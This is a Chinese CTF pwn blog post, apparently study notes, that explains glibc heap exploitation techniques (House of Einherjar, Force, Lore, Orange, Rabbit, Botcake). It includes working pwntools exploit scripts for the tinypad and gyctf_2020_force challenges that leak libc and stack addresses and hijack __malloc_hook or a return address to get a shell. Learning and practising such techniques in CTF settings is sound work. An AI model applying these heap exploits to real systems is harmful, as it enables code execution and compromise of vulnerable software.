@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="1.House Of Einherjar其实就是off by null+堆叠 隐式链表：通过pre_size找上一个堆块，通过size找下一个堆块 补充一写，还是有些不同 当释放堆块下一个块是top_chunk的时候，free会与相邻后向地址进行合并，并且放入top_chunk,在申请时，就会从前面那个堆块的地址中申请出来 两个相邻的堆块，前一个堆块是free状态，free后一个堆块，会和前一个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House of 系列">
+<meta property="og:url" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/index.html">
+<meta property="og:site_name" content="小小pwn">
+<meta property="og:description" content="1.House Of Einherjar其实就是off by null+堆叠 隐式链表：通过pre_size找上一个堆块，通过size找下一个堆块 补充一写，还是有些不同 当释放堆块下一个块是top_chunk的时候，free会与相邻后向地址进行合并，并且放入top_chunk,在申请时，就会从前面那个堆块的地址中申请出来 两个相邻的堆块，前一个堆块是free状态，free后一个堆块，会和前一个">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748520715859-7d80fa77-3a35-46b0-8aa2-93dfaeb45ddc.png">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748520824957-0b92483d-0077-48e7-a1d7-a714678fddbd.png">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748621021404-b453f011-3eae-4cc5-acdc-9a90ff2a4bed.png">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748620889894-77dda6b2-4768-4d36-bde6-5c637604b7ae.png">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748620776767-6afbd373-ec2d-4ba3-80ea-23ffdcbbb72c.png">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748621192922-31f8e0d9-6e86-409c-b822-4267f8a5b83d.png">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748621581145-2911519e-a50c-40bb-b3eb-b4a8d08f7313.png">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748621911812-4e91cdc0-f1dc-4f8e-9973-9da0e41c7588.png">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748622198344-9cc04e17-c1a8-437a-9e6d-770b8f963f23.png">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748622285539-76373687-14ee-4dab-9794-47462126430d.png">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748522864101-d43e86bb-ef44-4061-a253-a3ab3b93df65.png">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748957521841-8b4f949c-6e68-42fc-bc97-3780236364c2.png">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748957145325-3f0ac31d-cb53-4aca-a2f1-ef35e9f478be.png">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1757952795005-e27058c9-e98c-4543-9fe4-eb59f25a22a3.png">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1759422664902-1fef5cb8-46f3-4122-bc81-51ed631cb46f.png">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1759422804791-e0f3d4ab-59bf-4f48-ac1d-0e14a83a3a6c.png">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1759422623334-4506a2b0-3bae-4032-9fe6-5f835eef6198.png">
+<meta property="og:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1759422981366-fbc6d4b6-8770-4e40-97d3-b6be5e81735d.png">
+<meta property="article:published_time" content="2025-11-18T04:52:21.000Z">
+<meta property="article:modified_time" content="2025-11-18T04:56:04.377Z">
+<meta property="article:author" content="和方煜">
+<meta property="article:tag" content="知识点">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748520715859-7d80fa77-3a35-46b0-8aa2-93dfaeb45ddc.png">
+
+<link rel="canonical" href="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>House of 系列 | 小小pwn</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">小小pwn</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/18/House-of-%E7%B3%BB%E5%88%97/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="和方煜">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小小pwn">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          House of 系列
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-11-18 12:52:21 / 修改时间：12:56:04" itemprop="dateCreated datePublished" datetime="2025-11-18T12:52:21+08:00">2025-11-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.9k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <hr>
+<h2 id="1-House-Of-Einherjar"><a href="#1-House-Of-Einherjar" class="headerlink" title="1.House Of Einherjar"></a>1.House Of Einherjar</h2><p>其实就是off by null+堆叠</p>
+<p>隐式链表：通过pre_size找上一个堆块，通过size找下一个堆块</p>
+<p>补充一写，还是有些不同</p>
+<p>当释放堆块下一个块是top_chunk的时候，<code>free</code>会与相邻后向地址进行合并，并且放入top_chunk,在申请时，就会从前面那个堆块的地址中申请出来</p>
+<p>两个相邻的堆块，前一个堆块是free状态，free后一个堆块，会和前一个堆块合并也就是unlink，如何找到前一个堆块，根据的是<code>pre_size</code>为的大小（其实就是两个堆块头部的偏移），还要绕过unlink，也就是前一个堆块的size位与后一个堆块的pre_size位相等</p>
+<p>虽说是相邻的（并且已经被free的堆块必须在前面也就是低地址），但是加入伪造了一个堆块在栈上</p>
+<p>fake_chunk的prev_size、size部分设置为0x100，fd、bk、fd_nextsize、bk_nextsize设置为fake_chunk自身地址，这样做是为了绕过free()函数后向合并时最后的unlink检查</p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748520715859-7d80fa77-3a35-46b0-8aa2-93dfaeb45ddc.png" alt="img"></p>
+<p>我们可以将后一个堆块的pre_size位设为负数，就可以找到栈上的那个堆块</p>
+<p>0x555555758049-0x7fffffffdf00&#x3D;0xffffd5555575a140</p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748520824957-0b92483d-0077-48e7-a1d7-a714678fddbd.png" alt="img"></p>
+<p><strong>例题：tinypad</strong></p>
+<p>当got表不可以打的时候，我们可以打free_hook,free_hook不可打，利用__environ，泄露栈地址打返回地址，返回地址不可打，我们可以打main函数的返回地址</p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748621021404-b453f011-3eae-4cc5-acdc-9a90ff2a4bed.png" alt="img"></p>
+<p><strong>将堆块伪造在0x602040</strong></p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748620889894-77dda6b2-4768-4d36-bde6-5c637604b7ae.png" alt="img"></p>
+<p>pre_size位设置的和将要被free的堆块大小相同，size位设为两个堆块的偏移</p>
+<p>fd、bk、fd_nextsize、bk_nextsize设置为fake_chunk自身地址</p>
+<p><strong>将要被free的堆块在0x6030f0</strong></p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748620776767-6afbd373-ec2d-4ba3-80ea-23ffdcbbb72c.png" alt="img"></p>
+<p>将pre_size设为两个堆块的偏移，将利用0ff by null 将 pre_inuse设置为0</p>
+<p>然后free堆块，top_chunk的地址就编程伪造堆块的地址了（0x602040）</p>
+<p>显示不是但是申请就是</p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748621192922-31f8e0d9-6e86-409c-b822-4267f8a5b83d.png" alt="img"></p>
+<p>存储堆块指针的数组在0x602140</p>
+<p>我们从0x602040申请0xe0，在申请一个堆块数据段刚好申请在0x602140</p>
+<p>req &#x3D; 0x602140-0x602040 - 0x20(0x10)</p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748621581145-2911519e-a50c-40bb-b3eb-b4a8d08f7313.png" alt="img"></p>
+<p>然后在申请一个堆块，这个堆块的数据段，就刚好位于储存指针的数组的位置，然后就是更改指针，实现任意地址写了</p>
+<p>然后就是如何泄露栈地址，与更改返回地址了</p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748621911812-4e91cdc0-f1dc-4f8e-9973-9da0e41c7588.png" alt="img"></p>
+<p>这样构造</p>
+<p>将堆块1的指针改为__environ，然后打印堆块1就可以泄露栈地址</p>
+<p>将堆块2的指针改为记录堆块1指针数组的地址，这样通过堆块2，更改堆块1的指针</p>
+<p>通过将堆块1的指针改为返回地址的栈的值</p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748622198344-9cc04e17-c1a8-437a-9e6d-770b8f963f23.png" alt="img"></p>
+<p>然后更改堆块1的内容为ogg即可，这道题改的是main函数的返回地址，free_hook和返回地址都改不了，不知道为啥</p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748622285539-76373687-14ee-4dab-9794-47462126430d.png" alt="img"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">dd(<span class="number">0xe8</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0xe8</span>)</span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">b&quot;B&quot;</span>*<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&quot;C&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&quot;D&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27; #   INDEX: 3&#x27;</span>)</span><br><span class="line">fd =u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;fd-&gt; &#x27;</span>+<span class="built_in">hex</span>(fd))</span><br><span class="line">libc_base = fd - <span class="number">0x3c4b78</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base-&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27; #   INDEX: 1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27; # CONTENT: &#x27;</span>)</span><br><span class="line">heap_addr = u32(p.recvuntil(<span class="string">&#x27;\x0a\x0a\x0a&#x27;</span>)[<span class="number">0</span>:<span class="number">3</span>].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1f0</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_addr-&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">chunk_list_addr=<span class="number">0x602040</span></span><br><span class="line">chunk2_addr=heap_addr+<span class="number">0xf0</span></span><br><span class="line">offset=chunk2_addr-chunk_list_addr</span><br><span class="line">log.success(<span class="string">&#x27;chunk_list_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(chunk_list_addr))</span><br><span class="line">log.success(<span class="string">&#x27;chunk2_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(chunk2_addr))</span><br><span class="line">log.success(<span class="string">&#x27;offset &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">add(<span class="number">0xe8</span>, <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0xe0</span>) + p64(offset))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload=p64(<span class="number">0x100</span>)+p64(offset)</span><br><span class="line">payload+=p64(chunk_list_addr)*<span class="number">4</span></span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">payload = p64(<span class="number">0xe8</span>) + p64(libc_base + libc.symbols[<span class="string">&quot;__environ&quot;</span>])</span><br><span class="line">payload += p64(<span class="number">0x100</span>) + p64(<span class="number">0x602148</span>)</span><br><span class="line">add(<span class="number">0xe0</span>, <span class="string">&quot;t&quot;</span>*<span class="number">0xe0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>, payload)</span><br><span class="line">bug()</span><br><span class="line">p.readuntil(<span class="string">&quot;# CONTENT: &quot;</span>)</span><br><span class="line">stack_env=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xf0</span></span><br><span class="line">edit(<span class="number">2</span>,p64(stack_env))</span><br><span class="line">gadget = [<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">gadget_addr = libc_base + gadget[<span class="number">2</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(gadget_addr))</span><br><span class="line">bug()</span><br><span class="line">p.readuntil(<span class="string">&quot;(CMD)&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;Q&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-house-of-froce"><a href="#2-house-of-froce" class="headerlink" title="2.house  of  froce"></a>2.house  of  froce</h2><p>控制top_chunk的地址</p>
+<p>top_chunk的size位大小有显示，我们只能申请堆块在堆得内存区域，而申请不到在bss段上（bss段在堆得下方，所以永远申请不到），如果我们改变top_chunk的size位使他为-1（0xffffffffffffffff），我们就可以申请一个超级大的堆块，使他转一圈转到bss段上</p>
+<p>在2.23和2.27的libc版本中，由于没有对top chunk的size合法性进行检查，因此如果我们能够通过堆溢出控制top chunk的size位为-1</p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748522864101-d43e86bb-ef44-4061-a253-a3ab3b93df65.png" alt="img"></p>
+<p>如何计算：</p>
+<p>req &#x3D; dest-old_top - 0x20(0x10)</p>
+<p>dest就是我们将要写入的地址</p>
+<p>1.如何修改top_chunk的size位</p>
+<p>申请一个挨着top_chunk的堆块堆溢出就可以修改</p>
+<p>2.需要泄露出top_chunk的地址，这道题直接打印出每个堆块的指针的地址，通过紧挨着top_chunk那个堆块就可以算出</p>
+<p>3.这道题打malloc_hook，为什么没有用ogg</p>
+<p>因为知道指针的地址，也就知道&#x2F;bin&#x2F;sh写入的地址，将malloc_hook改为system，申请堆块时候，写上&#x2F;bin&#x2F;sh的地址就可以（或者通过realloc调整栈帧）</p>
+<p><strong>例题：gyctf_2020_force</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">libc_base = add(<span class="number">0x200000</span>,<span class="string">b&#x27;aaaa&#x27;</span>)+<span class="number">0x200ff0</span></span><br><span class="line">malloc = libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base-&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">payload =p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">top_chunk = add(<span class="number">0x10</span>,payload)+<span class="number">0x10</span></span><br><span class="line">req = malloc -top_chunk-<span class="number">0x20</span></span><br><span class="line">add(req,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(system))</span><br><span class="line">p.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(top_chunk))</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-house-of-lore"><a href="#3-house-of-lore" class="headerlink" title="3.house  of  lore"></a>3.house  of  lore</h2><p>主要就是围绕smallbin的</p>
+<p>1.堆块如何进入smallbin，当unsortbin中有一个堆块，在申请一个堆块，大于unsortbin中的堆块，且unsortbin中的堆块不能合并，或者合并后也达不到大小，就会把unsortbin放入smallbin当中</p>
+<p>2.如何伪造堆块到smallbin中</p>
+<p>首先申请一个0x100的堆块</p>
+<p>在栈上伪造两个堆块，伪造他们的fd与bk，就像下面的一样</p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748957521841-8b4f949c-6e68-42fc-bc97-3780236364c2.png" alt="img"></p>
+<p>就像这样，然后将victim free掉(在这之前再申请一个堆块，防止与top chunk合并)，他会进入unsortbin，然后，在申请一个大于他的堆块，他就会进入smallbin，然后再修改victim的bk指针，这时栈上的两个假的堆块就会进入smallbin中</p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1748957145325-3f0ac31d-cb53-4aca-a2f1-ef35e9f478be.png" alt="img"></p>
+<p>然后我们再申请一个，victim就会被申请出来，smallbin先进先出，再申请一个，栈地址上的堆块就可以申请出来，就可以写数据，覆盖返回地址</p>
+<h2 id="4-House-of-Orange"><a href="#4-House-of-Orange" class="headerlink" title="4.House of Orange"></a>4.House of Orange</h2><p><strong>概述</strong> <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/#_2"><strong>¶</strong></a></p>
+<p>House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。</p>
+<p><strong>原理</strong> <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/#_3"><strong>¶</strong></a></p>
+<p>如我们前面所述，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p>
+<p>我们总结一下伪造的 top chunk size 的要求</p>
+<ol>
+<li>伪造的 size 必须要对齐到内存页（addr+size是0x1000（4kb）对齐的）</li>
+</ol>
+<p>因此我们伪造的 fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size</p>
+<ol>
+<li>size 要大于 MINSIZE(0x10)</li>
+<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>
+<li>size 的 prev inuse 位必须为 1</li>
+</ol>
+<p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。</p>
+<h2 id="5-house-of-rabbit"><a href="#5-house-of-rabbit" class="headerlink" title="5.house  of   rabbit"></a>5.house  of   rabbit</h2><p>利用触发 malloc consolidate，将fastbin的堆块放入unsortbin时候不会对size位进行检查，来实现堆叠</p>
+<p>触发malloc consolidate条件</p>
+<p>1.fastbin当中没有合适大小的堆块，先合并，合并不够就会被放入unsortbin（smallbin）这时不会对size位进行检查就触发堆叠了</p>
+<p>2.top chunk不够了</p>
+<h2 id="6-house-of-botcake"><a href="#6-house-of-botcake" class="headerlink" title="6.house of botcake"></a>6.house of botcake</h2><p><strong>glibc2.29～glibc2.31</strong>，tcache加入了 key 值来进行 double free 检测，以至于在旧版本时的直接进行 double free 变的无效，所以自然就有了绕过方法，绕过方法其中比较典型的就是 house of botcake，他的本质也是通过 UAF 来达到绕过的目的</p>
+<p>当 free 掉一个堆块进入 tcache 时，假如堆块的 bk 位存放的 <code>key == tcache_key</code> ， 就会遍历<strong>这个大小</strong>的 Tcache ，假如发现同地址的堆块，则触发 Double Free 报错。</p>
+<p>从攻击者的角度来说，我们如果想继续利用 Tcache Double Free 的话，一般可以采取以下的方法：</p>
+<p>之前只是检查链表的上一个，这次是检查全部的链表</p>
+<p>从攻击者的角度来说，我们如果想继续利用 Tcache Double Free 的话，一般可以采取以下的方法：</p>
+<ol>
+<li>破坏掉被 free 的堆块中的 key，绕过检查（常用）</li>
+<li>改变被 free 的堆块的大小，遍历时进入另一 idx 的 entries</li>
+<li><strong>House of botcake</strong>（常用没有edit）</li>
+</ol>
+<p>1.free后用uaf改bk，然后就可以再次free</p>
+<p>2没学</p>
+<p>3.House of botcacke 合理利用了 Tcache 和 Unsortedbin 的机制，同一堆块第一次 Free 进 Unsortedbin 避免了 key 的产生，第二次 Free 进入 Tcache，让高版本的 Tcache Double Free 再次成为可能。</p>
